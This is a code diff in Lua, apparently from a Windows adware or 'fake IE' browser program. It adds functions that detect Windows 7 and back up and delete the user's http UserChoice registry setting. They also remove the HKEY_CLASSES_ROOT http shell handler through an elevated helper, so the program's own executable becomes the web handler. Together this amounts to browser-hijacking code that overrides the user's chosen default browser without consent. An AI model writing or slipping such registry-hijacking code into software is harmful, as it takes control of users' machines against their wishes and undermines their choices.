@@ -278,6 +278,9 @@ function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
 	
+	--FunctionObj.TipLog("[TrySetDefaultBrowser] enter")
+	--DoSetDefaultBrowser()
+	
 	local tDefaultBrowser = tServerConfig["tDefaultBrowser"]
 	if type(tDefaultBrowser) ~= "table" or type(tUserConfig) ~= "table" then
 		FunctionObj.TipLog("[TrySetDefaultBrowser] get table info failed")
@@ -383,9 +386,31 @@ function CheckBrowserList(strProcessList)
 	return false
 end
 
+function IsWin7()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local sysVersion = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentVersion")
+	
+	if tonumber(sysVersion) and tonumber(sysVersion) > 6.0 and tonumber(sysVersion) < 6.2 then	
+		return true
+	end
+	return false
+end
 
 function DoSetDefaultBrowser()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	
+	FunctionObj.TipLog("[DoSetDefaultBrowser] has set default browser -- http")
+	if IsWin7() then
+		local userChoiceReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
+		local userChoice = FunctionObj.RegQueryValue(userChoiceReg)
+		if userChoice then
+			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRProgid", userChoice, "REG_SZ")
+		end
+		FunctionObj.DelRegValueInUAC("HKEY_CURRENT_USER", "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "Progid")
+	end
+	FunctionObj.DelRegValueInUAC("HKEY_CLASSES_ROOT", "http\\shell", "")
+	FunctionObj.CommitRegOperation()
+	
 	local strFakeIEPath = FunctionObj.GetExePath()
 	local strDefBrowRegPath = "HKEY_CLASSES_ROOT\\http\\shell\\open\\command\\"
 	local strOldDefBrowPath = FunctionObj.RegQueryValue(strDefBrowRegPath)
